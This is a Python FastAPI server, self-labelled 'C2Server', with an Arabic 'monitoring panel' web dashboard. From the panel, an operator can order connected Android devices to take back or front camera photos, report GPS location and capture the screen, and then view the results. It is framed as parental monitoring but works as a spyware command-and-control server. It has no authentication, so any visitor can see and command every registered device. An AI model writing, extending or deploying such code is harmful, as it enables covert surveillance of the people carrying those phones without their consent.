import asyncio
import json
import logging
from datetime import datetime
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("C2Server")

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True,
                   allow_methods=["*"], allow_headers=["*"])

device_connections = {}
parent_connections = {}
devices_info = {}

@app.websocket("/ws/device/{device_id}")
async def device_ws(ws: WebSocket, device_id: str):
    await ws.accept()
    device_connections[device_id] = ws
    devices_info[device_id] = {"device_id": device_id, "connected_at": datetime.now().isoformat(), "last_seen": datetime.now().isoformat(), "online": True}
    logger.info(f"جهاز متصل: {device_id}")
    try:
        while True:
            data = await ws.receive_text()
            msg = json.loads(data)
            mtype = msg.get("type")
            if mtype == "register":
                devices_info[device_id].update({"device_model": msg.get("device_model", ""), "android_version": msg.get("android_version", ""), "parent_id": msg.get("parent_id", "")})
                parent_id = msg.get("parent_id", "")
                if parent_id in parent_connections:
                    await parent_connections[parent_id].send_json({"type": "device_list", "devices": list(devices_info.values())})
            elif mtype == "location":
                pid = msg.get("parent_id", "")
                if pid in parent_connections:
                    await parent_connections[pid].send_json({"type": "location", "device_id": device_id, "lat": msg["lat"], "lng": msg["lng"], "timestamp": msg.get("timestamp", "")})
            elif mtype == "camera_photo":
                pid = msg.get("parent_id", "")
                if pid in parent_connections:
                    await parent_connections[pid].send_json({"type": "camera_photo", "device_id": device_id, "image": msg["image"], "camera": msg.get("camera", "back"), "timestamp": msg.get("timestamp", "")})
            elif mtype == "screen_capture":
                pid = msg.get("parent_id", "")
                if pid in parent_connections:
                    await parent_connections[pid].send_json({"type": "screen_capture", "device_id": device_id, "image": msg["image"], "timestamp": msg.get("timestamp", "")})
            elif mtype == "ping":
                devices_info[device_id]["last_seen"] = datetime.now().isoformat()
                await ws.send_json({"type": "pong"})
    except WebSocketDisconnect:
        device_connections.pop(device_id, None)
        if device_id in devices_info: devices_info[device_id]["online"] = False
        logger.info(f"جهاز قطع: {device_id}")

@app.websocket("/ws/parent/{parent_id}")
async def parent_ws(ws: WebSocket, parent_id: str):
    await ws.accept()
    parent_connections[parent_id] = ws
    logger.info(f"والد متصل: {parent_id}")
    await ws.send_json({"type": "device_list", "devices": list(devices_info.values())})
    try:
        while True:
            data = await ws.receive_text()
            msg = json.loads(data)
            mtype = msg.get("type")
            if mtype == "send_command":
                target = msg.get("target_device")
                command = msg.get("command")
                params = msg.get("params", {}); params["parent_id"] = parent_id
                if target in device_connections:
                    await device_connections[target].send_json({"type": "command", "command": command, "params": params})
                    await ws.send_json({"type": "command_status", "target_device": target, "command": command, "status": "sent"})
                else:
                    await ws.send_json({"type": "command_status", "target_device": target, "command": command, "status": "device_offline"})
            elif mtype == "get_devices":
                await ws.send_json({"type": "device_list", "devices": list(devices_info.values())})
    except WebSocketDisconnect:
        parent_connections.pop(parent_id, None)
        logger.info(f"والد قطع: {parent_id}")

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>لوحة المراقبة</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
body{background:#0a0a1a;color:#fff;padding:15px;direction:rtl}
.header{background:linear-gradient(135deg,#1a1a3e,#0d0d2b);padding:20px;border-radius:15px;margin-bottom:20px;text-align:center}
.header h1{font-size:22px}
.header p{font-size:13px;color:#888}
.status{display:flex;gap:10px;margin-bottom:20px}
.status-box{flex:1;background:#1a1a3e;padding:15px;border-radius:12px;text-align:center}
.status-box .num{font-size:28px;font-weight:bold;color:#4fc3f7}
.status-box .label{font-size:12px;color:#888;margin-top:5px}
.device-card{background:linear-gradient(135deg,#1e1e4a,#15153a);border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #2a2a5a}
.dh{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}
.dn{font-size:18px;font-weight:bold}
.ds{padding:4px 10px;border-radius:20px;font-size:12px}
.on{background:#00c85333;color:#00c853}
.off{background:#ff174433;color:#ff1744}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
button{background:#2a2a6a;border:none;color:#fff;padding:14px;border-radius:10px;font-size:14px;cursor:pointer;transition:0.3s}
button:active{transform:scale(0.96)}
.r{background:#6a2a2a}
.g{background:#2a6a3a}
.b{background:#1a3a6a}
.p{background:#4a2a6a}
#imgModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:none;justify-content:center;align-items:center;z-index:999}
#imgModal img{max-width:95%;max-height:95%;border-radius:10px}
#imgModal .close{position:absolute;top:20px;right:20px;font-size:30px;color:#fff;background:none;border:none}
.log-entry{background:#1a1a3e;padding:10px;border-radius:8px;margin-bottom:5px;font-size:12px;color:#ccc;border-right:3px solid #4fc3f7}
.tabs{display:flex;gap:10px;margin-bottom:20px}
.tab{flex:1;text-align:center;padding:12px;background:#1a1a3e;border-radius:10px;cursor:pointer;font-size:13px;border:none;color:#fff}
.tab.act{background:#3a3a8a;font-weight:bold}
.sec{display:none}
.sec.act{display:block}
</style>
</head>
<body>
<div class="header"><h1>👁️ لوحة المراقبة</h1><p id="connStatus">⏳ جاري الاتصال...</p></div>
<div class="tabs"><button class="tab act" onclick="st('dev')">📱 الأجهزة</button><button class="tab" onclick="st('log')">📋 السجل</button></div>
<div id="sec-dev" class="sec act">
<div class="status"><div class="status-box"><div class="num" id="devCount">0</div><div class="label">الأجهزة</div></div><div class="status-box"><div class="num" id="onCount">0</div><div class="label">متصل</div></div></div>
<div id="devicesContainer"><p style="text-align:center;color:#666;padding:20px">⏳ انتظار...</p></div></div>
<div id="sec-log" class="sec"><p style="color:#888;margin-bottom:10px">الأحداث:</p><div id="logContainer"></div></div>
<div id="imgModal" onclick="this.style.display='none'"><button class="close">&times;</button><img id="modalImg"></div>
<script>
const PID="parent_"+Math.random().toString(36).substr(2,6);
const URL="wss://"+window.location.host+"/ws/parent/"+PID;
let ws,devs={},logs=[];
function connect(){ws=new WebSocket(URL);
ws.onopen=()=>{document.getElementById("connStatus").textContent="✅ متصل";document.getElementById("connStatus").style.color="#4fc3f7";addLog("اتصال","تم الاتصال")};
ws.onmessage=e=>{const m=JSON.parse(e.data);handle(m)};
ws.onclose=()=>{document.getElementById("connStatus").textContent="❌ قطع...";document.getElementById("connStatus").style.color="#ff1744";setTimeout(connect,3000)};
ws.onerror=()=>ws.close()}
function handle(m){if(m.type=="device_list"){devs={};m.devices.forEach(d=>{devs[d.device_id]=d});render();addLog("قائمة","تم تحديث الأجهزة")}
else if(m.type=="location"){addLog("موقع",m.device_id+": "+m.lat+", "+m.lng)}
else if(m.type=="camera_photo"){addLog("كاميرا",m.device_id+" - "+m.camera);showImg(m.image)}
else if(m.type=="screen_capture"){addLog("شاشة",m.device_id);showImg(m.image)}
else if(m.type=="command_status"){addLog("أمر",m.command+" → "+m.status)}}
function render(){let h="",on=0;Object.keys(devs).forEach(id=>{let d=devs[id];if(d.online)on++;
h+='<div class="device-card"><div class="dh"><span class="dn">'+id+'</span><span class="ds '+(d.online?"on":"off")+'">'+(d.online?"🟢 متصل":"🔴 غير متصل")+'</span></div>'
h+='<div class="grid">'
h+='<button class="b" onclick="send(\''+id+'\',\'capture_photo\',{})">📷 تصوير</button>'
h+='<button class="p" onclick="send(\''+id+'\',\'capture_photo_front\',{})">🤳 سيلفي</button>'
h+='<button class="g" onclick="send(\''+id+'\',\'get_location\',{})">📍 موقع</button>'
h+='<button class="r" onclick="send(\''+id+'\',\'capture_screen\',{})">📱 شاشة</button>'
h+='</div></div>'});
document.getElementById("devCount").textContent=Object.keys(devs).length;
document.getElementById("onCount").textContent=on;
document.getElementById("devicesContainer").innerHTML=h||'<p style="text-align:center;color:#666">لا توجد أجهزة</p>'}
function send(dev,cmd,params){if(ws&&ws.readyState==1){ws.send(JSON.stringify({type:"send_command",target_device:dev,command:cmd,params:params}))}}
function showImg(b64){document.getElementById("modalImg").src="data:image/jpeg;base64,"+b64;document.getElementById("imgModal").style.display="flex"}
function addLog(t,m){const d=new Date().toLocaleTimeString();logs.push(d+" ["+t+"] "+m);document.getElementById("logContainer").innerHTML=logs.slice(-50).map(l=>'<div class="log-entry">'+l+'</div>').join("")}
function st(t){document.querySelectorAll(".sec").forEach(s=>s.classList.remove("act"));document.getElementById("sec-"+t).classList.add("act");document.querySelectorAll(".tab").forEach(b=>b.classList.remove("act"));event.target.classList.add("act")}
connect();
</script>
</body>
</html>"""

@app.get("/")
async def index():
    return HTMLResponse(DASHBOARD_HTML)

@app.get("/health")
async def health():
    return {"devices": len(device_connections), "parents": len(parent_connections)}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
